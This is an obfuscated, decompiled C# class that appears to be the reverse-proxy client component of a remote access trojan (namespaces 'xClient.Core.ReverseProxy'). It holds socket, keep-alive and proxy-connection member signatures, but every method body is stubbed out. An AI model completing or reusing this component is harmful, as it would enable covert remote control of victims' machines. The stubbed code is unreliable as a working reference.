using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using dg3ypDAonQcOidMs0w;
using xClient.Core.NetSerializer;
using xClient.Core.ReverseProxy.Packets;

public class GClass33
{
	public delegate void GDelegate3(GClass33 s, Exception ex);

	public delegate void GDelegate4(GClass33 s, bool connected);

	public delegate void GDelegate5(GClass33 s, GInterface4 packet);

	public delegate void GDelegate6(GClass33 s, GInterface4 packet, long length, byte[] rawData);

	public enum GEnum8
	{
		const_0,
		const_1
	}

	[CompilerGenerated]
	private sealed class Class27
	{
		public int int_0;

		internal static Class27 usam0BGWFww85xTingF;

		internal bool method_0(GClass1 t)
		{
			return true;
		}

		static Class27()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			w9vDjRGZPlPsqcnw62D();
		}

		internal static void agqNpuGJmeckxr97k85()
		{
		}

		internal static void RWeS0xGqWipJ2PFr0HQ()
		{
		}

		internal static bool kv8SPlG69YklBCT9VU0()
		{
			return true;
		}

		internal static Class27 gZk3rEGmAqagT8sypmG()
		{
			return null;
		}

		internal static int if7yTkGNV70MoRKyPAS(object object_0)
		{
			return 0;
		}

		internal static void w9vDjRGZPlPsqcnw62D()
		{
		}
	}

	[CompilerGenerated]
	private GDelegate3 gdelegate3_0;

	[CompilerGenerated]
	private GDelegate4 gdelegate4_0;

	[CompilerGenerated]
	private GDelegate5 gdelegate5_0;

	[CompilerGenerated]
	private GDelegate6 gdelegate6_0;

	private Socket socket_0;

	private List<GClass1> list_0;

	private readonly object object_0;

	private byte[] byte_0;

	private byte[] byte_1;

	private readonly Queue<byte[]> queue_0;

	private bool bool_0;

	private readonly object object_1;

	private readonly Queue<byte[]> queue_1;

	private bool bool_1;

	private readonly object object_2;

	private byte[] byte_2;

	private bool bool_2;

	private int int_0;

	private int int_1;

	private int int_2;

	private int int_3;

	private int int_4;

	private GEnum8 genum8_0;

	[CompilerGenerated]
	private bool bool_3;

	[CompilerGenerated]
	private Serializer serializer_0;

	private static GClass33 InC0vQ5XrYBppWxhAPg;

	public int BUFFER_SIZE => 0;

	public uint KEEP_ALIVE_TIME => 0u;

	public uint KEEP_ALIVE_INTERVAL => 0u;

	public int HEADER_SIZE => 0;

	public int MAX_PACKET_SIZE => 0;

	public GClass1[] ProxyClients => null;

	public bool Connected
	{
		[CompilerGenerated]
		get
		{
			return true;
		}
		[CompilerGenerated]
		private set
		{
		}
	}

	protected Serializer Serializer
	{
		[CompilerGenerated]
		get
		{
			return null;
		}
		[CompilerGenerated]
		set
		{
		}
	}

	public event GDelegate3 Event_0
	{
		[CompilerGenerated]
		add
		{
		}
		[CompilerGenerated]
		remove
		{
		}
	}

	public event GDelegate4 Event_1
	{
		[CompilerGenerated]
		add
		{
		}
		[CompilerGenerated]
		remove
		{
		}
	}

	public event GDelegate5 Event_2
	{
		[CompilerGenerated]
		add
		{
		}
		[CompilerGenerated]
		remove
		{
		}
	}

	public event GDelegate6 Event_3
	{
		[CompilerGenerated]
		add
		{
		}
		[CompilerGenerated]
		remove
		{
		}
	}

	private void method_0(Exception ex)
	{
	}

	private void method_1(bool connected)
	{
	}

	private void method_2(GInterface4 packet)
	{
	}

	private void method_3(GInterface4 packet, long length, byte[] rawData)
	{
	}

	protected GClass33()
	{
	}

	protected void method_4(IPAddress ip, ushort port)
	{
	}

	private void method_5(IAsyncResult result)
	{
	}

	private void method_6(object state)
	{
	}

	public void method_7<T>(T packet) where T : GInterface4
	{
	}

	public void method_8<T>(T packet) where T : GInterface4
	{
	}

	private void method_9(object state)
	{
	}

	private byte[] method_10(byte[] payload)
	{
		return null;
	}

	private void method_11(bool clear = false)
	{
	}

	public void method_12()
	{
	}

	public void method_13(ReverseProxyConnect command)
	{
	}

	public GClass1 method_14(int connectionId)
	{
		return null;
	}

	public void method_15(int connectionId)
	{
	}

	static GClass33()
	{
		WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		J2lXSbGBQYV1iVsQB4W();
	}

	internal static object NfAQLGGxqU2ucCYw86H(object object_3, object object_4)
	{
		return null;
	}

	internal static bool RqB74y5zh4jCvSGZKwO()
	{
		return true;
	}

	internal static GClass33 H17K8DGtNZX72B6Dwaw()
	{
		return null;
	}

	internal static object v6U5oYGcCSAjXaDFpSV(object object_3, object object_4)
	{
		return null;
	}

	internal static void seE6OUGHQgJqRgL6HDP(object object_3, object object_4, object object_5)
	{
	}

	internal static void qPtLxPGv9Yc09grlSp7(object object_3, object object_4, bool connected)
	{
	}

	internal static void XFnvhfGPjJ1JP81ZjKx(object object_3, object object_4, object object_5)
	{
	}

	internal static void V4gWDiG134YRdXuHAmj(object object_3, object object_4, object object_5, long length, object object_6)
	{
	}

	internal static object apjhARGpubHIk96gH8h(object object_3)
	{
		return null;
	}

	internal static void VN0M1LGVZRdGC0xkcKU(object object_3)
	{
	}

	internal static void t9hwBAGk5CTJu7Ic0jL()
	{
	}

	internal static void fIhbQbGYLy9nr4d0f3H()
	{
	}

	internal static AddressFamily gqjmh6GFC9AYpjZF7eU(object object_3)
	{
		return (AddressFamily)(object)null;
	}

	internal static void CotAeXGlmsYKDCFKHnT(object object_3, uint keepAliveInterval, uint keepAliveTime)
	{
	}

	internal static void SVwvv6GgrLH7oqCVGjL(object object_3, object object_4, int int_5)
	{
	}

	internal static object oTItMbGaDhkVogygQsZ(object object_3, object object_4, int int_5, int int_6, SocketFlags socketFlags_0, object object_5, object object_6)
	{
		return null;
	}

	internal static void dASpcJGjL0usasdgPdC(object object_3, object object_4, int int_5)
	{
	}

	internal static bool Hr0dxTGnAJSrth5DW1y(object object_3)
	{
		return true;
	}

	internal static int MjNCBwG27d1djLvRbDK(object object_3)
	{
		return 0;
	}

	internal static int BNHkSaGwTNFYrhZee4u(object object_3, int int_5)
	{
		return 0;
	}

	internal static object YPBMOVGSsVNNIvhlIw2(int int_5)
	{
		return null;
	}

	internal static void zNoxfWGU352CXK141Ie(object object_3, int int_5, object object_4, int int_6, int int_7)
	{
	}

	internal static object YKEt6iG4ErMG725CyeV(object object_3)
	{
		return null;
	}

	internal static object FdjQsWG7tB31UvYuFUi(object object_3)
	{
		return null;
	}

	internal static object OxSsW9G574iapgxjvAq(object object_3, object object_4)
	{
		return null;
	}

	internal static int z2OXZQGG3ZPmeWMtbJ7(object object_3, object object_4)
	{
		return 0;
	}

	internal static object IkFmZrGoIdGYlDu3rdk(object object_3)
	{
		return null;
	}

	internal static object LtCBhaGf35a1MdHLBbv(int int_5)
	{
		return null;
	}

	internal static void lopoINGTEmL4J4Gw6Zb(object object_3)
	{
	}

	internal static void fYm2M0GsWuuQbDU3igG(object object_3)
	{
	}

	internal static void VGjQ7UGiWibNgZOJmUk(object object_3)
	{
	}

	internal static int sAFSgLGIpYWguPHCK4u(object object_3)
	{
		return 0;
	}

	internal static void pRv830GK08je1SN4KqW(object object_3, int int_5)
	{
	}

	internal static int voSRADGb3s2xK5eUnAV(object object_3)
	{
		return 0;
	}

	internal static void J2lXSbGBQYV1iVsQB4W()
	{
	}
}
